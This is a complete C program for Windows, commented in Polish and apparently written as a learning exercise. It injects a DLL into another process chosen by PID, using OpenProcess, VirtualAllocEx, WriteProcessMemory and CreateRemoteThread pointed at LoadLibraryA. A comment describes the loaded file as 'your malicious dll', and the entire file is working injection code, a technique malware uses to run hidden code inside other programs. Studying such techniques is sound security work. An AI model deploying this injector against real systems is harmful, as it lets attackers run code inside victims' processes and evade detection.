/*OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, LoadLibrary/GetProcAddres*/
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>




int main(void){
//otwarcie pliku payloadu z lokalizacji
const char* payload = "D:\\dokumenty\\nauka\\cpp\\testylin.dll";//path to your malicious dll
size_t spayload = strlen(payload) + 1;

//wejscie do procesu    
    DWORD pid;
    printf("podaj PID: ");
    scanf("%d", &pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    if(!hProcess){
        printf("[-] nie udalo sie otworzyc procesu [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] pomyslnie otwarto proces [%d]\n", pid);


//alokacja 
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, spayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(pAddress == NULL){
        printf("[-] nie udalo sie alokowac pamieci\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] pomyslnie alokowano pamiec [%p]\n", pAddress);


//zapisywanie
    if(!WriteProcessMemory(hProcess, pAddress, payload, spayload, NULL)){
        printf("[-] nie udalo sie zapisac payloadu [%d]\n",GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] zapisano payload\n");

// Pobierz adres LoadLibraryA
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        printf("[-] Nie udalo sie uzyskac adresu LoadLibraryA! Kod bledu: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] uzyskano adres LoadLibraryA\n");

//stworzenie zdalnego watku
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, pAddress, 0, NULL);
    if (!hThread) {
        printf("Nie udalo się utworzyc zdalnego watku! Kod bledu: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] utworzono zdalny watek!\n");

    printf("[+] DLL wstrzyknieto pomyslnie!\n");

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
